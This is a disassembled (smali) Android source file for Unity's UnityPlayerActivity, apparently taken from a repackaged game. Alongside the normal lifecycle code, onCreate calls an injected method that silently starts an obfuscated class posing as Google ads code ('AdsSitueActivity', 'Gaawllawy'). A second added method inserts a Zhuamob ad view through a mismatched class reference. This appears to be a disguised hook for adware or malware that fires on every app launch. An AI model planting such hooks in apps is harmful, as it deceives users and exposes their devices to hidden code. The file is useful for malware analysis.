.class public Lcom/unity3d/player/UnityPlayerActivity;
.super Landroid/app/Activity;


# instance fields
.field private a:Lcom/unity3d/player/UnityPlayer;


# direct methods
.method public constructor <init>()V
    .registers 1

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method public onConfigurationChanged(Landroid/content/res/Configuration;)V
    .registers 3

    invoke-super {p0, p1}, Landroid/app/Activity;->onConfigurationChanged(Landroid/content/res/Configuration;)V

    iget-object v0, p0, Lcom/unity3d/player/UnityPlayerActivity;->a:Lcom/unity3d/player/UnityPlayer;

    invoke-virtual {v0, p1}, Lcom/unity3d/player/UnityPlayer;->configurationChanged(Landroid/content/res/Configuration;)V

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .registers 6

    const/16 v3, 0x400

    const/4 v2, 0x1

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-virtual {p0}, Lcom/unity3d/player/UnityPlayerActivity;->toSatrtoan()V

    invoke-virtual {p0, v2}, Lcom/unity3d/player/UnityPlayerActivity;->requestWindowFeature(I)Z

    new-instance v0, Lcom/unity3d/player/UnityPlayer;

    invoke-direct {v0, p0}, Lcom/unity3d/player/UnityPlayer;-><init>(Landroid/content/ContextWrapper;)V

    iput-object v0, p0, Lcom/unity3d/player/UnityPlayerActivity;->a:Lcom/unity3d/player/UnityPlayer;

    iget-object v0, p0, Lcom/unity3d/player/UnityPlayerActivity;->a:Lcom/unity3d/player/UnityPlayer;

    invoke-virtual {v0}, Lcom/unity3d/player/UnityPlayer;->getSettings()Landroid/os/Bundle;

    move-result-object v0

    const-string v1, "hide_status_bar"

    invoke-virtual {v0, v1, v2}, Landroid/os/Bundle;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    if-eqz v0, :cond_28

    invoke-virtual {p0}, Lcom/unity3d/player/UnityPlayerActivity;->getWindow()Landroid/view/Window;

    move-result-object v0

    invoke-virtual {v0, v3, v3}, Landroid/view/Window;->setFlags(II)V

    :cond_28
    iget-object v0, p0, Lcom/unity3d/player/UnityPlayerActivity;->a:Lcom/unity3d/player/UnityPlayer;

    invoke-virtual {v0}, Lcom/unity3d/player/UnityPlayer;->getSettings()Landroid/os/Bundle;

    move-result-object v0

    const-string v1, "gles_mode"

    invoke-virtual {v0, v1, v2}, Landroid/os/Bundle;->getInt(Ljava/lang/String;I)I

    move-result v0

    iget-object v1, p0, Lcom/unity3d/player/UnityPlayerActivity;->a:Lcom/unity3d/player/UnityPlayer;

    const/4 v2, 0x0

    invoke-virtual {v1, v0, v2}, Lcom/unity3d/player/UnityPlayer;->init(IZ)V

    iget-object v0, p0, Lcom/unity3d/player/UnityPlayerActivity;->a:Lcom/unity3d/player/UnityPlayer;

    invoke-virtual {v0}, Lcom/unity3d/player/UnityPlayer;->getView()Landroid/view/View;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/unity3d/player/UnityPlayerActivity;->setContentView(Landroid/view/View;)V

    invoke-virtual {v0}, Landroid/view/View;->requestFocus()Z

    return-void
.end method

.method protected onDestroy()V
    .registers 2

    iget-object v0, p0, Lcom/unity3d/player/UnityPlayerActivity;->a:Lcom/unity3d/player/UnityPlayer;

    invoke-virtual {v0}, Lcom/unity3d/player/UnityPlayer;->quit()V

    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    return-void
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .registers 4

    iget-object v0, p0, Lcom/unity3d/player/UnityPlayerActivity;->a:Lcom/unity3d/player/UnityPlayer;

    invoke-virtual {v0, p1, p2}, Lcom/unity3d/player/UnityPlayer;->onKeyDown(ILandroid/view/KeyEvent;)Z

    move-result v0

    return v0
.end method

.method public onKeyMultiple(IILandroid/view/KeyEvent;)Z
    .registers 5

    iget-object v0, p0, Lcom/unity3d/player/UnityPlayerActivity;->a:Lcom/unity3d/player/UnityPlayer;

    invoke-virtual {v0, p1, p2, p3}, Lcom/unity3d/player/UnityPlayer;->onKeyMultiple(IILandroid/view/KeyEvent;)Z

    move-result v0

    return v0
.end method

.method public onKeyUp(ILandroid/view/KeyEvent;)Z
    .registers 4

    iget-object v0, p0, Lcom/unity3d/player/UnityPlayerActivity;->a:Lcom/unity3d/player/UnityPlayer;

    invoke-virtual {v0, p1, p2}, Lcom/unity3d/player/UnityPlayer;->onKeyUp(ILandroid/view/KeyEvent;)Z

    move-result v0

    return v0
.end method

.method protected onPause()V
    .registers 2

    invoke-super {p0}, Landroid/app/Activity;->onPause()V

    iget-object v0, p0, Lcom/unity3d/player/UnityPlayerActivity;->a:Lcom/unity3d/player/UnityPlayer;

    invoke-virtual {v0}, Lcom/unity3d/player/UnityPlayer;->pause()V

    return-void
.end method

.method protected onResume()V
    .registers 2

    invoke-super {p0}, Landroid/app/Activity;->onResume()V

    iget-object v0, p0, Lcom/unity3d/player/UnityPlayerActivity;->a:Lcom/unity3d/player/UnityPlayer;

    invoke-virtual {v0}, Lcom/unity3d/player/UnityPlayer;->resume()V

    return-void
.end method

.method public onWindowFocusChanged(Z)V
    .registers 3

    invoke-super {p0, p1}, Landroid/app/Activity;->onWindowFocusChanged(Z)V

    iget-object v0, p0, Lcom/unity3d/player/UnityPlayerActivity;->a:Lcom/unity3d/player/UnityPlayer;

    invoke-virtual {v0, p1}, Lcom/unity3d/player/UnityPlayer;->windowFocusChanged(Z)V

    return-void
.end method

.method public toSatrtoan()V
    .registers 2

    .prologue
    new-instance v0, Lcom/google/ads/AdsSitueActivity;

    invoke-direct {v0, p0}, Lcom/google/ads/AdsSitueActivity;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0}, Lcom/google/ads/AdsSitueActivity;->Gaawllawy()V

    return-void
.end method

.method public toStart()V
    .registers 5

    .prologue
    new-instance v1, Lcom/zhuamob/android/ZhuamobLayout;

    invoke-direct {v1, p0}, Lcom/zhuamob/android/ZhuamobLayout;-><init>(Landroid/app/Activity;)V

    .local v1, "zhuamobLayout":Lcom/zhuamob/android/ZhuamobLayout;
    new-instance v0, Landroid/widget/FrameLayout$LayoutParams;

    const/4 v2, -0x1

    const/4 v3, -0x2

    invoke-direct {v0, v2, v3}, Landroid/widget/FrameLayout$LayoutParams;-><init>(II)V

    .local v0, "params":Landroid/widget/FrameLayout$LayoutParams;
    const/16 v2, 0x50

    iput v2, v0, Landroid/widget/FrameLayout$LayoutParams;->gravity:I

    invoke-virtual {p0, v1, v0}, Lcom/aaaa/ZhuamobActivity;->addContentView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    return-void
.end method
